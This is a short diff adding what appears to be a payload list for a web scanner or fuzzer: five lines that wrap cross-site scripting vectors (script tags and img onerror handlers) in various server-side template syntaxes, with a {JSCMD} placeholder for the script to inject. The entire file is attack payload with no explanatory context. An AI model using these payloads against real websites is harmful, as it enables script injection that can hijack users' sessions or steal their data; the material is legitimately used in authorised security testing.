@@ -1,0 +1,5 @@
+{{= "<script>{JSCMD}</script>" }}
+{{ "<img src=x onerror=%s>" % "{JSCMD}" }}
+<%= "<script>{JSCMD}</script>" %>
+{% set a = "<img src=x onerror={JSCMD}>" %}
+${"<script>{JSCMD}</script>"}
